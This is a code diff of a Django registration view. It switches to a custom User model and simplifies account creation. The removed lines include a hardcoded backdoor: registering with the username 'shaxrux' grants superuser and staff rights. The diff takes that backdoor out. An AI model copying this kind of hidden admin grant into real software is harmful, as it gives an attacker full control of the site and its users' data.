@@ -1,9 +1,9 @@
 from django.shortcuts import render, redirect
 from django.views import View
-from django.contrib.auth.models import User
-from .serializers import UserSerializer
 from django.contrib.auth.hashers import make_password, check_password
 from django.contrib.auth import login, logout
+from .serializers import UserSerializer
+from .models import User
 import secrets
 
 
@@ -26,19 +26,9 @@ class RegisterView(View):
 		if user:
 			return render(request, "auth/register.html", {"error": "username already exists"})
 		
-		for _ in range(10):
-			token = secrets.token_hex(8)
-			user = User.objects.filter(first_name=token).first()
-			if not user:
-				user = User.objects.create_user(username=username, password=password, first_name=token)
-				if username == "shaxrux":
-					user.is_superuser = True
-					user.is_staff = True
-					user.save()
-
-				login(request, user)
-				return redirect("main:home")
-		return render(request, "auth/register.html", {"error": "Не удалось создать ключ, попробуйте пожалуйста снова"})
+		user = User.objects.create_user(username=username, password=password)
+		login(request, user)
+		return redirect("main:home")
 
 
 class LoginView(View):
